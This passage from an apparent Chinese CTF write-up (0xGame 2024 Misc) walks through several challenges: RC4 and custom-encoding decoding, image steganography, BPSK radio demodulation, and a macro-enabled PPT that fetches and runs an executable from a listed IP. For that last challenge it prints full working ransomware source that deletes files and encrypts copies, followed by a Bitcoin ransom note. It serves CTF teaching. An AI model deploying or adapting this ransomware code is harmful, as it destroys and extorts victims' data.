base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;0xGame&#123;This_is_a_fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">real_real_real_random</span>():</span><br><span class="line">    random_num = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">plain,K</span>):</span><br><span class="line">    S = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        S[i] = i</span><br><span class="line">        T[i] = K[i % <span class="built_in">len</span>(K)]</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        k = S[t]</span><br><span class="line">        cipher.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (base64.b64encode(<span class="string">&quot;&quot;</span>.join(cipher).encode())).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base3</span>(<span class="params">s</span>):</span><br><span class="line">    base3_s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        dec_value = <span class="built_in">ord</span>(i)</span><br><span class="line">        base3_c = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> dec_value &gt; <span class="number">0</span>:</span><br><span class="line">            base3_c += <span class="built_in">str</span>(dec_value % <span class="number">3</span>)</span><br><span class="line">            dec_value = dec_value // <span class="number">3</span></span><br><span class="line">        base3_c = base3_c[::-<span class="number">1</span>].rjust(<span class="number">5</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        base3_s += base3_c</span><br><span class="line">    <span class="keyword">return</span> (base3_s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manbo_encode</span>(<span class="params">base3_s</span>):</span><br><span class="line">    manbo_dict = &#123;<span class="string">&quot;0&quot;</span>:<span class="string">&quot;曼波&quot;</span>,<span class="string">&quot;1&quot;</span>:<span class="string">&quot;哦耶&quot;</span>,<span class="string">&quot;2&quot;</span>:<span class="string">&quot;哇嗷&quot;</span>&#125;</span><br><span class="line">    manbo_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> base3_s:</span><br><span class="line">        manbo_text += manbo_dict[i]</span><br><span class="line">    <span class="keyword">return</span> manbo_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">i</span>):</span><br><span class="line">    flag_part = flag[i:i+<span class="number">1</span>]</span><br><span class="line">    a = real_real_real_random()</span><br><span class="line">    b = RC4(flag_part,a)</span><br><span class="line">    c = base3(b)</span><br><span class="line">    d = manbo_encode(c)</span><br><span class="line">    <span class="keyword">return</span> a,d  <span class="comment"># key:a  ciphertext:d</span></span><br></pre></td></tr></table></figure><p>分析一下可以知道先生成随机数用作RC4的KEY，再传入flag_part进行RC4加密，之后进行三进制编码，最后自定义了一个曼波编码，于是可以编写<code>decode.py</code>并进行远程交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manbo_decode</span>(<span class="params">d</span>):</span><br><span class="line">    manbo_dict = &#123;<span class="string">&quot;曼波&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;哦耶&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;哇嗷&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(d),<span class="number">2</span>):</span><br><span class="line">        c += manbo_dict[d[i:i+<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base3</span>(<span class="params">c</span>):</span><br><span class="line">    b = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">5</span>):</span><br><span class="line">        b += <span class="built_in">chr</span>(<span class="built_in">int</span>(c[i:i+<span class="number">5</span>],base=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">cipher,K</span>):</span><br><span class="line">    S = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        S[i] = i</span><br><span class="line">        T[i] = K[i % <span class="built_in">len</span>(K)]</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    plain = []</span><br><span class="line">    cipher = base64.b64decode(cipher.encode()).decode()</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        k = S[t]</span><br><span class="line">        plain.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(plain)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    key = p.recvline().decode().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getciphertext</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    ciphertext = p.recvline().decode().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">k,c</span>):</span><br><span class="line">    c2 = manbo_decode(c)</span><br><span class="line">    c3 = base3(c2)</span><br><span class="line">    pf = RC4(c3,k)</span><br><span class="line">    <span class="keyword">return</span> pf</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.98.178.117&quot;</span>,<span class="number">1111</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    generate()</span><br><span class="line">    key = getkey()</span><br><span class="line">    ciphertext = getciphertext()</span><br><span class="line">    part_of_flag = decode(key,ciphertext)</span><br><span class="line">    flag += part_of_flag</span><br><span class="line">    <span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><h3 id="报告哈基米"><a href="#报告哈基米" class="headerlink" title="报告哈基米"></a>报告哈基米</h3><p>题目附件只给了一个 <code>mijiha.png</code>，拖入010 Editor看一下，一眼就能看见文件尾的逆置字符串，再关注一下chunk块就能发现倒数第二个IDAT块未满的情况下还跟了一个IDAT块，不过其实眼神好一些可以直接注意到上方的 <code>txt.ahijim</code>：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036752-7ea27f23-a417-43f3-b395-08b721a52d6a.png" alt="img"></p><p>先对文件尾的字符串逆置一下可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Maybe You Need To Know Arnold Cat?</span><br></pre></td></tr></table></figure><p>查阅资料可以知道这是猫映射变换，可以进行逆变换，不过需要知道<code>a,b</code>参数以及<code>shuffle_times</code>置乱次数，经过一些尝试可以发现这些参数通过LSB隐写进图片中了，可以用stegsolve，也可以用zsteg：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037547-f4c4ceed-b651-4cf6-b0fd-8d21adcbd1c1.png" alt="img"></p><p>之后编写脚本或者直接在网上找到逆变换脚本即可解出flag前半部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_decode</span>(<span class="params">image,a,b</span>):</span><br><span class="line">    decode_image = Image.new(image.mode, image.size)</span><br><span class="line">    h,w = image.size</span><br><span class="line">    data = image.load()</span><br><span class="line">    ddata = decode_image.load()</span><br><span class="line">    N = h</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            nx = ((a * b + <span class="number">1</span>) * x - b * y) % N</span><br><span class="line">            ny = (y - a * x) % N</span><br><span class="line">            ddata[ny, nx] = data[y, x]</span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;mijiha.png&quot;</span>)</span><br><span class="line">origin_img = arnold_decode(img,<span class="number">35</span>,<span class="number">7</span>)</span><br><span class="line">origin_img.show()</span><br></pre></td></tr></table></figure><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037557-5e9b95ad-5e7f-47a1-8fa8-206d5bd7005d.png" alt="img"></p><p>再分析多出来的chunk块，仔细观察可以发现是zip逆置了，提取出来：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037368-a1815d7c-d52a-44a3-9741-46bc752930db.png" alt="img"></p><p>解压得到<code>mijiha.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?reppuT sihT sI</span><br><span class="line">2526565031717334081355849302824518400002066054780560033875031426082285618693525319794798626066006125490363219506086284195590452459190680646206136430850230509326192863922658924373311369100100099532515379974605057083065159988318523088554342510823923801250157027140252790785117812414283997607047894726844336402237327944299070706739459672938738683171995926543691983512367190948019577689694975313311316787244413406201168210658030717811912751907802312004909911805602609847391116950248882484065492329404895296665244558410377999740959307786584149849</span><br></pre></td></tr></table></figure><p>同样将其整段逆置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9489414856877039590479997730148554425666925984049232945604842888420596111937489062065081199094002132087091572191187170308560128611026043144427876131133135794969867759108490917632153891963456295991713868378392769549376070709924497237322046334486274987407067993824142187115870972520417207510521083293280152434558803258138899515603807505064799735152359900010019631133734298562293682916239050320580346316026460860919542540955914826806059123630945216006606268974979135253968165822806241305783300650874506602000048154282039485531804337171305656252</span><br><span class="line">Is This Tupper?</span><br></pre></td></tr></table></figure><p>查找Tupper相关资料，发现有在线工具可以直接解，拿到flag后半部分：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037419-470a092d-c366-4137-aa75-fe013deb6c5d.png" alt="img"></p><p>或者在github上也能找到相关项目<a href="https://github.com/cariad/tupper%EF%BC%9A">https://github.com/cariad/tupper：</a></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037462-21c119ef-a046-4e68-916d-77905048fbfc.png" alt="img"></p><h3 id="神秘电波"><a href="#神秘电波" class="headerlink" title="神秘电波*"></a>神秘电波*</h3><p>搜索一下grc文件，不难发现这是gnuradio图形化设计文件。下载gnuradio后打开即可看到流程图。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635605-a295e945-e07f-46e7-9efc-fc44bfc57b36.png" alt="img"></p><p>从constellation object那个模块可以看到，这里是进行了bpsk调制，只不过后面稍微加了一点简单的数学运算。去gnuradio的<a href="https://wiki.gnuradio.org/index.php?title=Simulation_example:_BPSK_Demodulation">官方文档</a>可以查到bpsk的解调方法。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635510-905d8f72-ebb2-4582-91f8-6018e9187144.png" alt="img"></p><p>但是显然这边还得改改，有几点要注意，首先文档中不是像题目中一样从文件输入的，文档中用的是虚拟源，输出也是虚拟的。另外题目中调制时有polyphase clock sync这一步，而题目中没有，所以在解调的时候得加上。因此，预期的解调流程图如下：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635602-71bd6865-9da5-454f-9c25-9de25cb3bc39.png" alt="img"></p><p>点击顶上的run，先generate，再execute。这个小窗口刚出来差不多就可以关掉了，以免生成的flag.txt太大。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635529-f390f874-9f7f-4062-bd1c-9196806f846b.png" alt="img"></p><p>用010 editor可以看到，flag.txt是个二进制文件，每个字节不是00就是01。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635731-01d4bfee-6401-4bea-8a2d-2e55cdee971b.png" alt="img"></p><p>用脚本将00转换成0,01转换成1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0x01</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> i==<span class="number">0x00</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>转换出的二进制丢进cyberchef即可看见flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130636752-7821b8ea-6fb7-4cc7-9145-d42f905b8aea.png" alt="img"></p><p>由于解调时一些数据的丢失，这里存在一些乱码。题目提示了flag是标准uuid形式，结合前后不难推断出flag：0xGame{38df7992-6c53-11ef-b522-c8348e2c93c6}</p><h3 id="重生之我在南邮当CTF大王"><a href="#重生之我在南邮当CTF大王" class="headerlink" title="重生之我在南邮当CTF大王"></a>重生之我在南邮当CTF大王</h3><p>硬玩游戏可以拿到flag2,flag3,flag4，不过flag1可能需要按照许愿树的hint去做</p><p>可以在<code>data</code>文件夹中找到各张地图的json数据，一个一个看就会发现所有flag都在里面</p><p>flag1:</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130636833-dcd7f82c-ff56-4b44-9a11-5a839c293098.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130637500-2ff3dd78-ed0e-4886-8fc7-90c5a6ae8eac.png" alt="img"></p><p>flag2:</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638100-af5d6f20-19f5-4edb-a228-22cb3c5579de.png" alt="img"></p><p>flag3:</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638134-712c87bb-d7f3-49ca-91b6-8d7fc5eba5f1.png" alt="img"></p><p>flag4:</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638119-019fc670-6063-4f07-9960-0d586c637a4d.png" alt="img"></p><p>上网找找资料可以知道这是兽音编码后的结果：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638141-7ce00bf5-e5a8-430a-8c42-b22866fcacbe.png" alt="img"></p><p>四段拼起来就是flag</p><h3 id="Crazy-Thursday-v-me-50-btc"><a href="#Crazy-Thursday-v-me-50-btc" class="headerlink" title="Crazy Thursday v me 50 btc*"></a>Crazy Thursday v me 50 btc*</h3><p>下载下来的附件中有一个pptm文件，搜索一下可以知道这是一个启用了宏的ppt，查看一下宏代码。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805642487-473cd06e-7f5a-49a1-b100-fcd878c9f25c.png" alt="img"></p><p>（另外这里还有个小彩蛋，移开第二张ppt里的图片可以看到一行字，不过这与题目无关）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46824302/1730805642882-7f23840a-dfb2-4223-8c12-8ad7820a1387.png?x-oss-process=image/format,webp/resize,w_1125,limit_0" alt="img"></p><p>这里的逻辑是在播放到第二张ppt的时候就从某个服务器上下载summer.exe并运行。</p><p>访问一下<a href="http://47.239.17.55/summer.exe%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%BE%97%E5%88%B0summer.exe%E3%80%82">http://47.239.17.55/summer.exe，下载得到summer.exe。</a></p><p>丢进exeinfope查一下，可以看到这个程序是用python编写的，或者熟悉的可以直接从图标看出来这点。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643014-9fbb4bd1-6fae-40d5-96ee-c65a18f64a5b.png" alt="img"></p><p>先用<a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor.py</a>将其拆为pyc文件</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643061-c6df86d5-1177-4984-bf04-8fbcc76cf402.png" alt="img"></p><p>从拆解出的文件中找到summer.pyc，使用uncompyle6（pip install下载）对其进行反编译，得到python代码。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643130-57f10e22-f8a5-4c83-8954-745771b854af.png" alt="img"></p><p>正如在题目描述中所说，这里为了师傅们电脑的安全性，删除了文件加密和原文件删除的相关代码，但是这并不影响做题，接下来在这里贴出未删减版：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> k3y,readme</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params"><span class="built_in">dir</span>=<span class="string">&#x27;.&#x27;</span>, ext=[<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;.7z&#x27;</span>, <span class="string">&#x27;.rar&#x27;</span>, <span class="string">&#x27;.gz&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.mp3&#x27;</span>, <span class="string">&#x27;.wav&#x27;</span>, <span class="string">&#x27;.avi&#x27;</span>, <span class="string">&#x27;.doc&#x27;</span>, <span class="string">&#x27;.docx&#x27;</span>, <span class="string">&#x27;.xls&#x27;</span>, <span class="string">&#x27;.xlsx&#x27;</span>, <span class="string">&#x27;.pdf&#x27;</span>, <span class="string">&#x27;.ppt&#x27;</span>, <span class="string">&#x27;.pptx&#x27;</span>, <span class="string">&#x27;.mp4&#x27;</span>, <span class="string">&#x27;.mov&#x27;</span>, <span class="string">&#x27;.flv&#x27;</span>, <span class="string">&#x27;.mkv&#x27;</span>, <span class="string">&#x27;.swf&#x27;</span>, <span class="string">&#x27;.dll&#x27;</span>, <span class="string">&#x27;.sys&#x27;</span>, <span class="string">&#x27;.iso&#x27;</span>, <span class="string">&#x27;.vmdk&#x27;</span>, <span class="string">&#x27;.vhd&#x27;</span>, <span class="string">&#x27;.vhdx&#x27;</span>, <span class="string">&#x27;.ova&#x27;</span>,]</span>):</span><br><span class="line">    ff = []</span><br><span class="line">    <span class="keyword">for</span> ro, di, fi <span class="keyword">in</span> os.walk(<span class="built_in">dir</span>):</span><br><span class="line">        <span class="keyword">for</span> ex <span class="keyword">in</span> ext:</span><br><span class="line">            <span class="keyword">for</span> na <span class="keyword">in</span> fnmatch.<span class="built_in">filter</span>(fi, <span class="string">&#x27;*&#x27;</span> + ex):</span><br><span class="line">                fp = os.path.join(ro, na)</span><br><span class="line">                ff.append(fp)</span><br><span class="line">    <span class="keyword">return</span> ff</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    cipher = DES3.new(key, DES3.MODE_ECB)</span><br><span class="line">    padded_plaintext = pad(plaintext, DES3.block_size)</span><br><span class="line">    ciphertext = cipher.encrypt(padded_plaintext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">m</span>):</span><br><span class="line">    p=getPrime(<span class="number">256</span>)</span><br><span class="line">    q=getPrime(<span class="number">256</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    m1 = bytes_to_long(m)</span><br><span class="line">    c = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">    <span class="keyword">return</span> (n,c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">txt,m</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Oops!.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(txt+<span class="string">&#x27;\n\n\n&#x27;</span>)</span><br><span class="line">        f.write(base64.b64encode((<span class="built_in">str</span>(m[<span class="number">0</span>].bit_length())+<span class="built_in">str</span>(m[<span class="number">0</span>])+<span class="built_in">str</span>(m[<span class="number">1</span>].bit_length())+<span class="built_in">str</span>(m[<span class="number">1</span>])).encode()).decode())</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    fl = f()</span><br><span class="line">    <span class="keyword">for</span> fi <span class="keyword">in</span> fl:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fi, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        os.remove(fi)</span><br><span class="line">        data = encrypt1(k3y, data)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fi+<span class="string">&#x27;.encrypted&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line">    msg=encrypt2(k3y)</span><br><span class="line">    release(readme,msg)</span><br></pre></td></tr></table></figure><p>这里的代码明显是出题人自己手搓的，所以网上是没法找到用于解密的程序的。</p><p>接下来阅读一下代码的逻辑，可以看出大概是这样一个过程：查找当前目录下一些特定后缀名的文件–&gt;读取文件内容–&gt;删除原文件–&gt;对文件内容进行3DES加密–&gt;将内容写进一个新的文件，文件名为原文件名加上.encrypted–&gt;对前面一步中3DES时使用的密钥进行RSA加密，并且将RSA使用的n和加密后的密文以特定格式拼接后进行base64编码，以特定格式写入一同释放的文本中。</p><p>文本在附件中已经给出，就是Oops!.txt，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hello, w8nn9z! </span><br><span class="line">Your file has been encrypted! </span><br><span class="line">I have to inform you that due to my special encryption algorithm, all important files on your computer have been encrypted! This means that without a special key provided by me, you will not be able to access these files. </span><br><span class="line">To recover your files, you must follow the following steps: </span><br><span class="line">1. Pay the equivalent of $50 in Bitcoin to the designated Bitcoin address before the next Crazy Thursday. :) </span><br><span class="line">2. After payment is completed, please send the transaction ID and the string at the end of this file via email to st4rr@example.com . </span><br><span class="line">3. After receiving your payment confirmation, I will provide you with the key and the instruction on how to use it. </span><br><span class="line">If payment is not received within 72 hours, the price of the decryption instruction will double. In addition, if you attempt to recover data on your own or do not follow instructions, your files may be permanently deleted. :( </span><br><span class="line">Warning: Do not attempt to unlock files or use third-party tools on your own, as this may result in 